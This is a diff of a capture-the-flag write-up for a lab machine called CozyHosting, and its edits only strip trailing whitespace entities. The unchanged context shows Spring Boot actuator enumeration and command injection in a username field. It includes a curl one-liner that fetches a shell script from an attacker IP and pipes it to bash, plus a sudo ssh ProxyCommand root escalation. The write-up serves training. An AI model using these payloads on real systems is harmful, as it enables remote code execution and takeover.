@@ -30,7 +30,7 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-We can add this host to our `/etc/hosts` file and start proxying traffic through Burpsuite.&#x20;
+We can add this host to our `/etc/hosts` file and start proxying traffic through Burpsuite.
 
 ### Web Enum -> Spring Boot -> Admin
 
@@ -103,7 +103,7 @@ $ curl --silent http://cozyhosting.htb/actuator/mappings | jq
             },
 ```
 
-There was one that stood out, which was the `/executessh` one. However, I was not allowed to interact with this service at all, presumably because I am not given permissions as an administrator or something.&#x20;
+There was one that stood out, which was the `/executessh` one. However, I was not allowed to interact with this service at all, presumably because I am not given permissions as an administrator or something.
 
 When checking the `/actuator/sessions` directory, we can find another cookie:
 
@@ -141,7 +141,7 @@ Upgrade-Insecure-Requests: 1
 
 ```
 
-Seems that the host resolution happens in the website, so let's replace that with `127.0.0.1`. When that happens, the error is `Host key verification failed`. The username part seems to be passed directly into...somewhere.&#x20;
+Seems that the host resolution happens in the website, so let's replace that with `127.0.0.1`. When that happens, the error is `Host key verification failed`. The username part seems to be passed directly into...somewhere.
 
 I tried some basic Command Injection using `;` and \`, and found that the latter worked.
 
@@ -172,7 +172,7 @@ Using this, we can try to get a reverse shell as the user. When testing random p
 
 <figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
 
-The `bash` reverse shell one-liner didn't work and was quite problematic with all of its special characters, so I used a `curl` one-liner instead.&#x20;
+The `bash` reverse shell one-liner didn't work and was quite problematic with all of its special characters, so I used a `curl` one-liner instead.
 
 ```bash
 curl${IFS}10.10.14.22/shell.sh|bash
@@ -349,4 +349,4 @@ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
 
 <figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
 
-Rooted!&#x20;
+Rooted!
